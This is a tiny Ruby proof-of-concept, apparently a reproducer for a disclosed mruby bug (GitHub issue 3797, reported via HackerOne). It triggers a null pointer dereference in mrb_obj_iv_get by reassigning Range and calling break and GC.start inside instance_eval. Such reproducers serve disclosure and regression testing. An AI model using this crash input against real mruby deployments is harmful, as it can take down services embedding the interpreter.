# Null pointer dereference in mrb_obj_iv_get (mirb)
# Issue: https://github.com/mruby/mruby/issues/3797
# Reported via hackerone

Range = 1
false.instance_eval {
   break*Array,GC.start{1}
}
('a'..'z').to_a